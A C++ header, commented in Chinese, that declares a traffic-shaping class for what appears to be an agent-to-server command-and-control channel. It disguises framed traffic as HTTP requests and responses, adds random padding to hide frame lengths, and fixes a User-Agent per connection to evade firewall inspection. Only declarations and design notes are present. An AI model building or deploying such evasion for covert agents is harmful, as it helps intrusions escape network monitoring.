#pragma once
// TCP的流量整形器: 在帧协议([4B长度][载荷])外层包 HTTP 形状的伪装头,
// 使线上流量在防火墙浅检测下形似 HTTP 请求/响应, 降低信道特征。
//
// 职责边界: 只负责"帧 <-> 线上字节"的整形, 不涉及协议语义;
// 伪装逻辑(随机路径/UA 池/填充 padding/轮询 jitter)统一在此模块扩展,
// 上层(CommsManager)只调用 Wrap/TryStripHeader/StripPadding 等入口。
//
// 线上格式: [HTTP伪装头] \r\n\r\n + [4B长度][载荷][随机填充][2B填充长度]
// 剥头 + 剥填充后剩余字节与帧协议完全一致, FrameParser 零改动。
#include <cstdint>
#include <string>
#include <vector>

namespace cleat {

    class RingBuffer;

    // 帧方向: 请求(Agent->Server, GET 形状) / 响应(Server->Agent, 200 形状)
    enum class MimicDirection { Request, Response };

    class TrafficShaper {
    public:
        // 包装出站帧: 返回 [HTTP头]\r\n\r\n + frame_with_length(含4B长度头)。
        // 内部对帧追加随机填充并修正长度字段(见 AddPadding), 使线上帧长
        // 不等于真实载荷长, 破坏按帧长分类的流量特征。
        // ua: 伪装头的 User-Agent(**连接级粘性**, ) —— 同一连接内
        // UA 恒定(每帧变化本身是异常特征); 由 TcpTransport 连接建立时经
        // UAProvider::Pick() 选定并持有。空 = 池随机(兼容既有调用)。
        static std::vector<uint8_t> Wrap(MimicDirection dir,
            const std::vector<uint8_t>& frame_with_length,
            const std::string& ua = "");

        // 从接收流中消费 HTTP 伪装头(到 \r\n\r\n 为止, 含分隔符)。
        // 头未完整到达返回 false(等待更多数据); 消费成功返回 true。
        // 头超长(>4KB, 正常头远小于此)视为异常, 丢弃 4KB 继续找, 防恶意/防呆。
        static bool TryStripHeader(RingBuffer& ring);

        // 帧填充: 在 [4B长度][载荷] 帧尾追加 [随机填充][2B填充长度(小端)],
        // 并把 4B 长度字段修正为 载荷+填充+2。与 Server frame.go 填充格式必须一致。
        static std::vector<uint8_t> AddPadding(
            const std::vector<uint8_t>& frame_with_length);

        // 剥离帧尾填充: 输入 FrameParser 读出的帧体(含填充), 原地还原为真实载荷。
        // 帧体不足 2 字节或填充长度非法返回 false(丢弃该帧)。
        static bool StripPadding(std::vector<uint8_t>& frame_body);

        // 轮询间隔抖动已迁出(节拍合一 A1): 所有通道的 check-in/心跳节拍统一由
    // HeartbeatPolicy(PollClock/HeartbeatScheduler)承担, 本模块只做线上整形。

    private:
        static std::vector<uint8_t> BuildRequestHeader(const std::string& ua);
        static std::vector<uint8_t> BuildResponseHeader(size_t body_len);
    };

} // namespace cleat
